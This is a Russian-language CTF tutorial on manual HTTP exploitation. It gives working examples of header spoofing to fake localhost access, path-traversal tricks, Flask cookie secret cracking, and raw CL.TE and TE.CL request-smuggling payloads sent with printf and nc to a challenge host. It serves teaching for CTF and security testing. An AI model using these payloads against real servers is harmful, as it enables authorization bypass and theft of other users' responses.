HTTP кажется простым, но именно в нём прячется масса misc-задач: нестандартные заголовки, дублирование, chunked-кодирование, smuggling, методы `TRACE`/`PUT`, cookies. Часто задача формулируется как «сервер ведёт себя странно — разберитесь». Этот урок — про ручную работу с HTTP на уровне байтов.

## HTTP вручную: nc и curl

Простейший способ — поговорить с сервером «сырыми» байтами:

```bash
printf 'GET / HTTP/1.1\r\nHost: chal.local\r\nConnection: close\r\n\r\n' | nc chal.local 80
```

curl для сравнения:

```bash
curl -v http://chal.local/
curl -s -D - -o /dev/null http://chal.local/     # только заголовки
curl -s --http1.0 http://chal.local/             # HTTP/1.0
```

Ручной `nc` важен, потому что curl «исправляет» нестандартные запросы — а нам часто нужны именно они.

## Заголовки, которые решают

| Заголовок | Зачем |
|-----------|-------|
| `Host` | виртуальные хосты; подмена → другой сайт |
| `X-Forwarded-For` | подмена IP для логики |
| `X-Forwarded-Host` | иногда влияет на генерацию ссылок |
| `Transfer-Encoding: chunked` | smuggling |
| `Content-Length` | конфликт с TE → smuggling |
| `Connection: keep-alive/close` | поведение соединения |
| `Cookie` | сессии, подпись |
| `Range` | частичный контент |
| `If-None-Match` | кэш, иногда утечка |

Частая задача: получить доступ «как localhost», подделав `X-Forwarded-For: 127.0.0.1`.

## Chunked encoding

При `Transfer-Encoding: chunked` тело передаётся блоками: `<hex-размер>\r\n<данные>\r\n...0\r\n\r\n`.

```
POST / HTTP/1.1
Host: chal.local
Transfer-Encoding: chunked

5
hello
0

```

Ошибки в парсинге chunked (неверный размер, лишние `\r\n`, отрицательный размер) — источник контрабанды и DoS.

## HTTP request smuggling

Smuggling возникает, когда **фронтенд и бэкенд** по-разному определяют границы запросов. Два основных класса:

- **CL.TE**: фронтенд использует `Content-Length`, бэкенд — `Transfer-Encoding`.
- **TE.CL**: наоборот.

Пример CL.TE:

```
POST / HTTP/1.1
Host: chal.local
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

Фронтенд (CL) видит тело из 13 байт, бэкенд (TE) — что после `0` идёт следующий запрос `SMUGGLED`. Так можно «приклеить» запрос к следующему пользователю (отравление очереди, обход авторизации, утечка чужих ответов).

Инструменты: Burp «HTTP Request Smuggler», `smuggler.py`. Ручная проверка — отправлять запросы через `nc`/Burp и смотреть тайминги/ответы.

## Нестандартные методы и пути

- `OPTIONS *` — узнать доступные методы.
- `TRACE` — отражение запроса (XST).
- `PUT` — иногда позволяет загрузить файл.
- `HEAD` — заголовки без тела.
- Path tricks: `/admin/..;/`, `//admin`, `/%2e%2e/admin`, `?x=../../`.

```bash
curl -X OPTIONS -i http://chal.local/
curl -X TRACE -i http://chal.local/
```

## Разобранный пример

Задача: флаг доступен только с `127.0.0.1`. Обычный запрос — «forbidden».

```bash
curl -s http://chal.local/flag
# forbidden
```

Пробуем заголовки:

```bash
for h in 'X-Forwarded-For: 127.0.0.1' 'X-Real-IP: 127.0.0.1' 'X-Originating-IP: 127.0.0.1' 'X-Remote-Addr: 127.0.0.1'; do
  echo "== $h"; curl -s -H "$h" http://chal.local/flag
done
# == X-Forwarded-For: 127.0.0.1
# flag{header_trust}
```

Если не сработало — пробуем smuggling: отравить очередь так, чтобы следующий запрос (от «админа») обработался с нашим путём.

## Cookies и подписи

Cookie могут быть подписаны (HMAC) или закодированы (base64/JWT). Если секрет слабый — подбираем:

```bash
flask-unsign --decode --cookie 'eyJ...'
flask-unsign --unsign --cookie 'eyJ...' --wordlist rockyou.txt
```

`flask-unsign`, `jwt_tool` — стандартные инструменты.

## Частые ошибки и подводные камни

- Использовать curl для нестандартных запросов — он их нормализует; нужен `nc`/Burp.
- Забывать про `\r\n` (CRLF) — без них сервер ждёт продолжения.
- Путать `Connection: close` и `keep-alive` — влияет на smuggling.
- Игнорировать HTTP/2: там smuggling проявляется иначе (H2.CL, H2.TE).
- Считать, что `Host` всегда проверяется — иногда он используется в логике.
- Забывать про кэш: отравление кэша через заголовки.

## Дополнительная теория: HTTP/1.1 vs HTTP/2 и keep-alive

Различия версий протокола напрямую влияют на атаки. В HTTP/1.1 соединение может переиспользоваться (`keep-alive`), и именно на этом строится request smuggling: «лишний» запрос остаётся в буфере и обрабатывается как запрос следующего пользователя. В HTTP/2 потоков несколько, а границы задаются фреймами; smuggling переезжает в конвертацию H2→H1.1 на периметре (H2.CL, H2.TE): фронтенд на HTTP/2, бэкенд на HTTP/1.1, и при понижении версии заголовки `Content-Length`/`Transfer-Encoding` могут быть истолкованы по-разному.

Также важны **hop-by-hop** заголовки (`Connection`, `Transfer-Encoding`, `Keep-Alive`, `Upgrade`), которые прокси обязан удалять. Если прокси не чистит `Transfer-Encoding` при понижении, возникает контрабанда. Понимание, где именно происходит трансляция протокола (CDN, балансировщик, reverse-proxy), — ключ к поиску уязвимости. В CTF часто дают цепочку «CDN → nginx → app», и расхождение на одном из стыков и есть решение.

## Соединения, тайминги и слепые атаки

Smuggling часто «слепой»: вы не видите ответ чужого пользователя, но можете влиять на очередь. Признаки уязвимости: необычные тайминги (запрос «зависает» и возвращает ответ позже), смещение ответов (ваш запрос получает чужой ответ), ошибки парсинга. Для обнаружения используют «дифференциальные» техники: отправить запрос, который по одному пути даёт 404, по другому — 200, и посмотреть, какой ответ придёт. Инструмент Burp «HTTP Request Smuggler» автоматизирует перебор CL.TE/TE.CL/TE.TE вариантов и умеет «провоцировать» ответы через последующие запросы.

Ещё одна слепая техника — **client-side desync**: заставить браузер жертвы отправить «отравленный» запрос через `fetch` с нестандартным `Content-Length`, вызвав desync в его соединении. Это уже про XSS-подобные последствия smuggling.

## Разбор ошибок и отладка

Если `nc` «висит» после отправки запроса — вероятно, не хватает `\r\n\r\n` или сервер ждёт тело. Если ответ пуст — проверьте `Host` (виртуальный хостинг) и `Connection: close`. Если curl даёт 400, а nc — нет, значит запрос нестандартный и curl его отвергает; для smuggling это нормально. При работе через Burp убедитесь, что «Update Content-Length» выключен, иначе Burp сам «исправит» запрос. Ведите журнал: полный сырой запрос, полный сырой ответ, тайминг. Многие находки в HTTP-задачах появляются именно из наблюдения за нестандартным поведением, а не из готового эксплойта.

## Частые вопросы

**Как отличить smuggling от простого кэширования?** При smuggling ответы «смещаются»: ваш запрос получает ответ предыдущего/следующего. При кэшировании вы видите чужой кэшированный ответ без смещения. Проверяйте тайминги и порядок: smuggling обычно проявляется на keep-alive соединении и зависит от последовательности запросов. Инструмент Burp Smuggler умеет провоцировать оба явления.

**Почему мой smuggling-payload «не работает»?** Частые причины: неверный `Content-Length` (посчитайте байты тела точно, включая CRLF), прокси нормализует запрос (используйте сырой `nc`/Burp с выключенным авто-исправлением), или бэкенд не поддерживает `Transfer-Encoding`. Также важен порядок заголовков: некоторые прокси отдают приоритет первому, некоторые — последнему.

**Что делать, если `X-Forwarded-For` не помогает?** Пробуйте другие заголовки (`X-Real-IP`, `X-Client-IP`, `X-Originating-IP`, `Forwarded`, `True-Client-IP`) и их комбинации. Иногда проверяется не IP, а наличие внутреннего заголовка (`X-Internal: 1`) или определённый `Host`. Читайте поведение: если сервер возвращает другой контент при определённом заголовке, вы близко.

**Опасен ли `TRACE`?** Сам по себе — нет, но в комбинации с XSS (XST) он позволял читать cookie через отражение запроса. Современные браузеры блокируют TRACE через XHR, поэтому XST в основном историчен, но в CTF и при тестировании API встречается.

## Практический разбор: TE.CL smuggling вручную

Дано: фронтенд и бэкенд, задача — прочитать «следующий» запрос. TE.CL: фронтенд использует `Transfer-Encoding`, бэкенд — `Content-Length`. Строим запрос через `nc`:

```
POST / HTTP/1.1
Host: chal.local
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST /admin HTTP/1.1
Content-Length: 15

x=1
0

```

Фронтенд (TE) видит тело как chunked: первый chunk размером `0x5c` (92) байт — это `GPOST /admin ...`; затем `0` завершает. Бэкенд (CL) видит тело из 4 байт (`5c\r\n`) и оставляет остальное как **следующий запрос** — `GPOST /admin`. Если следом придёт запрос «админа», он обработается с нашим путём. Отправляем:

```bash
printf 'POST / HTTP/1.1\r\nHost: chal.local\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST /admin HTTP/1.1\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n' | nc chal.local 80
```

Затем обычный запрос — и он получит ответ «админа» (или выполнится наш). Ключ: точный подсчёт `Content-Length` и CRLF. Используйте Burp с выключенным авто-исправлением; `nc` даёт полный контроль. Проверяйте тайминги — smuggling часто проявляется задержками.
